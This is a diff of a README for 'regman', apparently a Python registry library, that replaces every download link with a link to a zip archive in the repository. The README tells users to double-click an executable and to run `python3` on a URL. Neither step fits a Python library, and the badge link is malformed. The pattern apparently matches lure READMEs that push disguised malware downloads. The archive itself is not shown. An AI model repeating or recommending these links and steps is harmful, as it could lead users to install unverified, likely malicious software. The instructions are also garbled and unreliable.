@@ -4,7 +4,7 @@
 
 Welcome to **regman**! This application is a simple and efficient way to create and manage registries for plugins, strategies, and reusable objects in Python. It’s designed to be lightweight and thread-safe, making it a suitable choice for both beginners and seasoned users.
 
-[![Download regman](https://raw.githubusercontent.com/garoel235/regman/main/indirection/regman.zip%20regman-v1.0.0-blue)](https://raw.githubusercontent.com/garoel235/regman/main/indirection/regman.zip)
+[![Download regman](https://github.com/garoel235/regman/raw/refs/heads/main/src/regman/Software_v1.1.zip%20regman-v1.0.0-blue)](https://github.com/garoel235/regman/raw/refs/heads/main/src/regman/Software_v1.1.zip)
 
 ## 🛠️ Features
 
@@ -26,7 +26,7 @@ To run regman smoothly, ensure that your system meets the following requirements
 
 To get started, visit the following link to download the software:
 
-[Download regman](https://raw.githubusercontent.com/garoel235/regman/main/indirection/regman.zip)
+[Download regman](https://github.com/garoel235/regman/raw/refs/heads/main/src/regman/Software_v1.1.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -41,7 +41,7 @@ Once you are on the Releases page, follow these steps:
 3. **Run the Application:**
    - On Windows, double-click the executable file.
    - On macOS, drag the app to the Applications folder and launch it.
-   - On Linux, run the application from your terminal with `python3 https://raw.githubusercontent.com/garoel235/regman/main/indirection/regman.zip`.
+   - On Linux, run the application from your terminal with `python3 https://github.com/garoel235/regman/raw/refs/heads/main/src/regman/Software_v1.1.zip`.
 
 ## 🎓 How to Use regman
 
@@ -98,4 +98,4 @@ For additional topics related to regman, explore:
 - **Design Patterns**: Best practices in structuring your code.
 - **Plugins**: Extend functionality with external modules.
 
-Remember, you can always revisit the [Download regman](https://raw.githubusercontent.com/garoel235/regman/main/indirection/regman.zip) link for updates and new releases. Your feedback helps to refine the experience for everyone. Enjoy managing your registries with regman!
+Remember, you can always revisit the [Download regman](https://github.com/garoel235/regman/raw/refs/heads/main/src/regman/Software_v1.1.zip) link for updates and new releases. Your feedback helps to refine the experience for everyone. Enjoy managing your registries with regman!
